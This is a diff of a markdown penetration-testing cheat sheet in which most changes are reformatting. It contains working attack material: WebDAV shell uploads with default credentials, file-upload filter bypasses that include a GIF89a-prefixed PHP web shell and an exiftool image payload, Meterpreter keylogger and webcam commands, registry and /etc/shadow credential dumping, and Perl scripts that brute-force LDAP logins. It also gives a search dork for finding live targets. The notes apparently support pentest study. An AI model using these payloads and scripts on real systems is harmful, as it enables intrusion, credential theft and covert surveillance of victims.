 Okay so webdav is old as hell, and not used very often. It is pretty much like ftp. But you go through http to access it. So if you have webdav installed on a xamp-server you can access it like this: `cadaver 192.168.1.101/webdav`
 Then sign in with username and password. The default username and passwords on xamp are:
 
-> Username: wampp
-> Password: xampp
+  ```
+  Username: wampp
+  Password: xampp
+  ```
 
-Then use put and get to upload and download. With this you can of course upload a shell that gives you better access. If you are looking for live examples just google this: `inurl:webdav site:com`
-Test if it is possible to upload and execute files with webdav.
-
-`davtest -url <http://192.168.1.101> -directory demo_dir -rand aaaa_upfileP0C`
-
-If you managed to gain access but is unable to execute code there is a workaround for that! So if webdav has prohibited the user to upload `.asp` code, and `pl` and whatever, we can do this:
-
-- upload a file called `shell443.txt`, which of course is your `.asp` shell.
-- And then you rename it to `shell443.asp;.jpg`. Now you visit the page in the browser and the asp code will run and return your shell.
-- References <http://secureyes.net/nw/assets/Bypassing-IIS-6-Access-Restrictions.pdf>
+  - Then use put and get to upload and download. With this you can of course upload a shell that gives you better access. If you are looking for live examples just google this: `inurl:webdav site:com` Test if it is possible to upload and execute files with webdav.
+  - `davtest -url <http://192.168.1.101> -directory demo_dir -rand aaaa_upfileP0C`
+  - If you managed to gain access but is unable to execute code there is a workaround for that! So if webdav has prohibited the user to upload `.asp` code, and `pl` and whatever, we can do this:
+    - upload a file called `shell443.txt`, which of course is your `.asp` shell.
+    - And then you rename it to `shell443.asp;.jpg`. Now you visit the page in the browser and the asp code will run and return your shell.
+    - References <http://secureyes.net/nw/assets/Bypassing-IIS-6-Access-Restrictions.pdf>
 
 - Webmin
       Webmin is a webgui to interact with the machine.
@@ -3264,26 +3183,20 @@ If you managed to gain access but is unable to execute code there is a workaroun
       `sudo wpscan -u <http://cybear32c.lab/> --random-agent`
 
 - Bypass File Upload Filtering
-      One common way to gain a shell is actually not really a vulnerability, but a feature! Often times it is possible to upload files to the webserver. This can be abused byt just uploading a reverse shell. The ability to upload shells are often hindered by filters that try to filter out files that could potentially be malicious. So that is what we have to bypass.
-  - Rename it
-      We can rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as `php. php phtml, .php, .php3, .php4, .php5, and .inc`
-
-      `asp asp, .aspx`
-
-      `perl .pl, .pm, .cgi, .lib`
-
-      `jsp .jsp, .jspx, .jsw, .jsv, and .jspf`
-
+  - One common way to gain a shell is actually not really a vulnerability, but a feature! Often times it is possible to upload files to the webserver. This can be abused byt just uploading a reverse shell. The ability to upload shells are often hindered by filters that try to filter out files that could potentially be malicious. So that is what we have to bypass.
+  - Rename it; We can rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as 
+    - `php. php phtml, .php, .php3, .php4, .php5, and .inc`
+    - `asp asp, .aspx`
+    - `perl .pl, .pm, .cgi, .lib`
+    - `jsp .jsp, .jspx, .jsw, .jsv, and .jspf`
     - Coldfusion .cfm, .cfml, .cfc, .dbm
     - GIF89a; If they check the content. Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:
-
       ```shell
       GIF89a;
       <?
       system($_GET['cmd']);//or you can insert your complete shell code
       ?>
       ```
-
   - In image
     - `exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg`
   - References:
@@ -3299,60 +3212,48 @@ If you have a meterpreter shell you are able to do a lot of thing with very litt
 - Show help of all commands: `-h`
 - Dump windows hashes for further analysis: `hashdump`
 - Keylogger
-
-      ```shell
-      keysscan_start
-      keyscan_dump
-      keyscan_stop
-      ```
+  ```shell
+  keysscan_start
+  keyscan_dump
+  keyscan_stop
+  ```
 - Mic and webcam commands
-
-      ```shell
-      record_mic     Record audio from the default microphone for X seconds
-      webcam_chat    Start a video chat
-      webcam_list    List webcams
-      webcam_snap    Take a snapshot from the specified webcam
-      webcam_stream  Play a video stream from the specified webcam
-      ```
+  ```shell
+  record_mic     Record audio from the default microphone for X seconds
+  webcam_chat    Start a video chat
+  webcam_list    List webcams
+  webcam_snap    Take a snapshot from the specified webcam
+  webcam_stream  Play a video stream from the specified webcam
+  ```
 
 ### Dumping passwords and hashes on windows
 
 This most likely requires administrative rights, that's why the chapter is found here and not in priv-esc. Once you have a hash you can move on to the Password Cracking-chapter where we discuss different techniques of cracking hashes.
 
 Windows stores passwords in SAM - Security Account Manager. Passwords are stored differently depending on the operating system. Up until (and including) Windows 2003 stored the passwords in LAN Manager (LM) and NT LAN Manager (NTLM). LM is incredibly insecure. From windows vista and on the system does not use LM, only NTLM. So it is a bit more secure.
-
-LM and NTLM >= Windows 2003
-NTLM > Windows vista
+- LM and NTLM >= Windows 2003
+- NTLM > Windows vista
 
 #### LM Hashes
 
 LM hashes can be really easy to crack. The LM part in the example below is the first part.
-
-Administrator:500:FA21A6D3CF(01B8BAAD3B435B51404EE:C294D192B82B6AA35C3DFCA81F1F59BC:::
-
-- Example of NT
-
-Administrator:500:NO PASSWORD*********************:BE134K40129560B46534340292AF4E72:::
-
-- We can use crackstation or hashkiller to crack those hashes
-
-`fgdump.exe`
-
-We can use fgdump.exe (locate fgdump.exe on kali) to extract NTLM and LM Password hashes. Run it and there is a file called 127.0.0.1.pwndump where the hash is saved. Now you can try to brute force it.
+- `Administrator:500:FA21A6D3CF(01B8BAAD3B435B51404EE:C294D192B82B6AA35C3DFCA81F1F59BC:::`
+- Example of NT `Administrator:500:NO PASSWORD*********************:BE134K40129560B46534340292AF4E72:::`
+- We can use crackstation or hashkiller to crack those hashes `fgdump.exe`
+- We can use fgdump.exe (locate fgdump.exe on kali) to extract NTLM and LM Password hashes. Run it and there is a file called 127.0.0.1.pwndump where the hash is saved. Now you can try to brute force it.
 
 ### Windows Credencial Editor (WCE)
 
 WCE can steal NTLM passwords from memory in cleartext! There are different versions of WCE, one for 32 bit systems and one for 64 bit. So make sure you have the right one.
 
 - You can run it like this: `wce32.exe -w`
-- Loot registry without tools
-      This might be a better technique than using tools like wce and fgdump, since you don't have to upload any binaries. Get the registry:
+- Loot registry without tools: This might be a better technique than using tools like wce and fgdump, since you don't have to upload any binaries. Get the registry:
 
-      ```shell
-      C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
-      C:\> reg.exe save hklm\security c:\windows\temp\security.save
-      C:\> reg.exe save hklm\system c:\windows\temp\system.save
-      ```
+  ```CMD
+  C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
+  C:\> reg.exe save hklm\security c:\windows\temp\security.save
+  C:\> reg.exe save hklm\system c:\windows\temp\system.save
+  ```
 
 - The hashes can be extracted using `secretdump.py` or `pwdump`
 - Pwdump 7: <http://www.tarasco.org/security/pwdump_7/>
@@ -3361,12 +3262,12 @@ WCE can steal NTLM passwords from memory in cleartext! There are different versi
 
 VNC require a specific password to log in to. So it is not the same password as the user password. If you have a meterpreter shell you can run the post exploit module to get the VNC password.
 
-```shell
-background
-use post/windows/gather/credentials/vnc
-set session X
-exploit
-```
+  ```shell
+  background
+  use post/windows/gather/credentials/vnc
+  set session X
+  exploit
+  ```
 
 ## TCP-dump on windows
 
@@ -3374,22 +3275,22 @@ You can use meterpreter to easily take a tcp-dump, like this:
 
 ### Meterpreter
 
-      ```shell
-      run packetrecorder -li
-      run packetrecorder -i 1
+  ```shell
+  run packetrecorder -li
+  run packetrecorder -i 1
 
-      #Search for interesting files
+  #Search for interesting files
 
-      #Meterpreter
-      search -f *.txt
-      search -f*.zip
-      search -f *.doc
-      search -f*.xls
-      search -f config*
-      search -f*.rar
-      search -f *.docx
-      search -f*.sql
-      ```
+  #Meterpreter
+  search -f *.txt
+  search -f*.zip
+  search -f *.doc
+  search -f*.xls
+  search -f config*
+  search -f*.rar
+  search -f *.docx
+  search -f*.sql
+  ```
 
 ## Recursive search
   
@@ -3405,9 +3306,8 @@ Passwords and hashes
   - `cat /etc/passwd`
   - `cat /etc/shadow`
 - We can crack the password using john the ripper like this:
-      `unshadow passwd shadow > unshadowed.txt`
-
-      `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
+  - `unshadow passwd shadow > unshadowed.txt`
+  - `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
 - Mail
   - `/var/mail`
   - `/var/spool/mail`
@@ -3458,60 +3358,60 @@ Here is a repository of pre compiled binaries to use for exploit, instead of com
 
 You need to install `sudo apt-get install -y libnet-ldap-perl` perl module to carryout this enumeration.
 
-```perl
-#!/usr/bin/env perl
-use strict;
-use warnings;
-use Net::LDAP;
+  ```perl
+  #!/usr/bin/env perl
+  use strict;
+  use warnings;
+  use Net::LDAP;
 
-my $server   = "ldap.acme.com";
-my $base     = "dc=ldap,dc=acme,dc=com";
-my $filename = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt";
+  my $server   = "ldap.acme.com";
+  my $base     = "dc=ldap,dc=acme,dc=com";
+  my $filename = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt";
 
-open(my $fh, '<', $filename) or die $!;
+  open(my $fh, '<', $filename) or die $!;
 
-my $ldap = Net::LDAP->new($server) or die $@;
+  my $ldap = Net::LDAP->new($server) or die $@;
 
-while (my $word = <$fh>) {
-    chomp($word);    
-    
-    my $search = $ldap->search(
-        base    => $base,
-        scope   => 'sub',
-        filter  => '(&(uid='.$word.'))',
-        attrs   => ['dn']
-    );
-    
-    print "[+] Found valid login name $word\n"
-if(defined($search->entry));
-}
-```
+  while (my $word = <$fh>) {
+      chomp($word);    
+      
+      my $search = $ldap->search(
+          base    => $base,
+          scope   => 'sub',
+          filter  => '(&(uid='.$word.'))',
+          attrs   => ['dn']
+      );
+      
+      print "[+] Found valid login name $word\n"
+  if(defined($search->entry));
+  }
+  ```
 
 ### Password enumeration against ldap
 
-```perl
+  ```perl
 
-#!/usr/bin/env perl
-use strict;
-use warnings;
-use Net::LDAP;my $server   = "ldap.acme.com";
-my $user     = "twest";
-my $base     = "dc=acme,dc=com";
-my $filename = "wordlist.txt";open(my $fh, '<', $filename) or die $!;my $ldap = Net::LDAP->new($server) or die $@;my $search = $ldap->search(
-    base    => $base,
-    scope   => 'sub',
-    filter  => '(&(uid='.$user.'))',
-    attrs   => ['dn']
-);if(defined($search->entry)) {    my $user_dn = $search->entry->dn;    print "[*] Searching for valid LDAP login for $user_dn...\n";    while (my $word = <$fh>) {
-        chomp($word);        my $mesg = $ldap->bind($user_dn, password => $word);        if ($mesg and $mesg->code() == 0) {
-            print "[+] Found valid login $user_dn / $word\n";
-            exit;
-        }
-    }
-} else {
-    print "[x] $user is not a valid LDAP user...\n";
-    exit;
-}
-print "[x] No valid LDAP logins found...\n";
+  #!/usr/bin/env perl
+  use strict;
+  use warnings;
+  use Net::LDAP;my $server   = "ldap.acme.com";
+  my $user     = "twest";
+  my $base     = "dc=acme,dc=com";
+  my $filename = "wordlist.txt";open(my $fh, '<', $filename) or die $!;my $ldap = Net::LDAP->new($server) or die $@;my $search = $ldap->search(
+      base    => $base,
+      scope   => 'sub',
+      filter  => '(&(uid='.$user.'))',
+      attrs   => ['dn']
+  );if(defined($search->entry)) {    my $user_dn = $search->entry->dn;    print "[*] Searching for valid LDAP login for $user_dn...\n";    while (my $word = <$fh>) {
+          chomp($word);        my $mesg = $ldap->bind($user_dn, password => $word);        if ($mesg and $mesg->code() == 0) {
+              print "[+] Found valid login $user_dn / $word\n";
+              exit;
+          }
+      }
+  } else {
+      print "[x] $user is not a valid LDAP user...\n";
+      exit;
+  }
+  print "[x] No valid LDAP logins found...\n";
 
-```
+  ```
